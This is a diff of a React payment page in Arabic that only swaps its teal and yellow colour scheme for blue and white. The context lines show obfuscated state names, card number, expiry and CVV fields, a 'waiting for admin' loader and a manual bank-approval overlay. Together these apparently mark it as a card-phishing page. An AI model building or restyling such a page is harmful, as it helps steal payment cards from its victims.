@@ -418,13 +418,13 @@ export default function P1({ offerTotalPrice }: _P1Props) {
       {isWaitingAdmin && <FullPageLoader />}
 
       {showMessageOverlay && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a4a68]/95" dir="rtl">
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#1565c0]/95" dir="rtl">
           <div className="text-center space-y-6 px-8">
             <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
-              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-yellow-400/30" />
-              <div className="absolute h-20 w-20 rounded-full border-4 border-yellow-400/50" />
-              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-yellow-400/20">
-                <Smartphone className="h-8 w-8 text-yellow-400" />
+              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-white/30" />
+              <div className="absolute h-20 w-20 rounded-full border-4 border-white/50" />
+              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-white/20">
+                <Smartphone className="h-8 w-8 text-white" />
               </div>
             </div>
             <div className="space-y-3">
@@ -432,29 +432,24 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                 تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك والموافقة على العملية لإتمام الدفع.
               </p>
               <div className="flex items-center justify-center gap-2">
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "0ms" }} />
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "150ms" }} />
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "300ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "0ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "150ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "300ms" }} />
               </div>
             </div>
             {isConfirming ? (
               <div className="flex flex-col items-center gap-3 mt-2">
                 <div className="flex items-center justify-center gap-2">
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "0ms" }} />
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "150ms" }} />
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "300ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "0ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "150ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "300ms" }} />
                 </div>
-                <p className="text-sm font-semibold text-yellow-300">جاري انتظار موافقة البنك...</p>
+                <p className="text-sm font-semibold text-[#90caf9]">جاري انتظار موافقة البنك...</p>
               </div>
             ) : (
               <button
                 onClick={handleMessageConfirm}
-                className="mt-2 w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm transition-all"
-                style={{
-                  background: "linear-gradient(135deg, #f4ad27 0%, #e09a18 100%)",
-                  color: "#1a3d52",
-                  boxShadow: "0 6px 20px rgba(244,173,39,0.35)",
-                }}
+                className="mt-2 w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm bg-white text-[#1565c0] hover:bg-[#e3f2fd] transition-all shadow-lg"
               >
                 تم الموافقة في التطبيق
               </button>
@@ -475,7 +470,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         {/* Payment Method Selection */}
         <div className="bg-gradient-to-br from-gray-50 to-gray-100 rounded-lg sm:rounded-xl p-3 sm:p-5 md:p-6 border border-gray-200">
           <label className="flex items-center gap-2 text-gray-900 font-bold text-sm sm:text-base md:text-lg mb-3 sm:mb-4">
-            <ShieldCheck className="w-4 h-4 sm:w-5 sm:h-5 text-[#0a4a68]" />
+            <ShieldCheck className="w-4 h-4 sm:w-5 sm:h-5 text-[#1976d2]" />
             طريقة الدفع
           </label>
           <div className="space-y-2 sm:space-y-3">
@@ -511,7 +506,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                   border-2 rounded-lg sm:rounded-xl cursor-pointer transition-all duration-200
                   ${
                     selectedPaymentMethod === method.value
-                      ? "border-[#0a4a68] bg-white shadow-md"
+                      ? "border-[#1976d2] bg-white shadow-md"
                       : "border-gray-200 hover:border-gray-300 bg-white/50"
                   }
                   ${method.disabled ? "opacity-60 cursor-not-allowed" : ""}
@@ -536,7 +531,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                       setSelectedPaymentMethod(method.value)
                     }}
                     disabled={method.disabled}
-                    className="w-4 h-4 sm:w-5 sm:h-5 text-[#0a4a68] focus:ring-[#0a4a68] disabled:opacity-50 flex-shrink-0"
+                    className="w-4 h-4 sm:w-5 sm:h-5 text-[#1976d2] focus:ring-[#1976d2] disabled:opacity-50 flex-shrink-0"
                   />
                   <div className="flex items-center gap-1.5 sm:gap-2 flex-shrink-0">
                     {method.icons ? (
@@ -584,7 +579,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
               onChange={(e) => _s4(e.target.value.toUpperCase())}
               placeholder="CARDHOLDER NAME"
               dir="ltr"
-              className="h-12 sm:h-14 md:h-16 text-base sm:text-lg md:text-xl uppercase border-2 border-gray-300 focus:border-[#0a4a68] rounded-lg sm:rounded-xl"
+              className="h-12 sm:h-14 md:h-16 text-base sm:text-lg md:text-xl uppercase border-2 border-gray-300 focus:border-[#1976d2] rounded-lg sm:rounded-xl"
               required
             />
           </div>
@@ -592,7 +587,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
           {/* Card Number Input */}
           <div className="space-y-1.5 sm:space-y-2">
             <label className="flex items-center flex-wrap gap-1.5 sm:gap-2 text-gray-900 font-bold text-xs sm:text-sm md:text-base">
-              <CreditCard className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#0a4a68]" />
+              <CreditCard className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#1976d2]" />
               رقم البطاقة
               {isValidCard && (
                 <Badge variant="outline" className="border-green-500 text-green-700 text-[10px] sm:text-xs">
@@ -618,7 +613,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                   ? "border-green-500 focus:border-green-600" 
                   : _v1.length > 0 
                   ? "border-red-300 focus:border-red-500" 
-                  : "border-gray-300 focus:border-[#0a4a68]"
+                  : "border-gray-300 focus:border-[#1976d2]"
               }`}
               required
             />
@@ -662,7 +657,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                     ? "border-red-500 focus:border-red-600" 
                     : _v3.length === 5 && !expiryError
                     ? "border-green-500 focus:border-green-600"
-                    : "border-gray-300 focus:border-[#0a4a68]"
+                    : "border-gray-300 focus:border-[#1976d2]"
                 }`}
                 required
               />
@@ -672,7 +667,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
             </div>
             <div className="space-y-1.5 sm:space-y-2">
               <label className="flex items-center gap-1.5 sm:gap-2 text-gray-900 font-bold text-xs sm:text-sm md:text-base">
-                <Lock className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#0a4a68]" />
+                <Lock className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#1976d2]" />
                 CVV
               </label>
               <Input
@@ -685,7 +680,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                 className={`h-12 sm:h-14 md:h-16 text-lg sm:text-xl md:text-2xl font-mono border-2 rounded-lg sm:rounded-xl text-center ${
                   _v2.length === 3
                     ? "border-green-500 focus:border-green-600"
-                    : "border-gray-300 focus:border-[#0a4a68]"
+                    : "border-gray-300 focus:border-[#1976d2]"
                 }`}
                 required
               />
@@ -715,7 +710,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
           <Button
             type="submit"
             disabled={!isValidCard || !_v3 || _v2.length !== 3 || !!expiryError || !_v4}
-            className="w-full h-14 sm:h-16 md:h-18 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-lg sm:text-xl md:text-2xl rounded-lg sm:rounded-xl shadow-lg hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
+            className="w-full h-14 sm:h-16 md:h-18 bg-[#1976d2] hover:bg-[#1565c0] text-white font-bold text-lg sm:text-xl md:text-2xl rounded-lg sm:rounded-xl shadow-lg hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
           >
             <Lock className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
             دفع {finalPrice.toFixed(2)} ﷼
